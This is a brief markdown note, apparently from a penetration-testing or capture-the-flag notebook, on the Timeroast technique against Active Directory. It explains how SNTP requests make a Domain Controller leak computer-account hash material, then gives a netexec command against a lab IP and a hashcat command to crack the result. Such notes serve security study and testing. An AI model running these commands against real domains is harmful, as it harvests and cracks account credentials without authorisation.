# Timeroast

[More Info](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/TimeRoasting.html)
> Essentially, what this does is sending some weird SNTP packets that somehow the **Domain Controller** response with a packet (MAC) that is encrypted by the computer account's NTLM hash.
> So we can request every computer accounts' hash and crack them, as a unauthenticated attacker

## Exploit

We can exploit this by simply run a `netexec` module on the DC.

```sh
nxc smb 10.10.11.75 -M timeroast
```

Then simply crack the hash

```sh
hashcat -a 0 -m 31300 --user ./hash /usr/share/wordlists/rockyou.txt
```

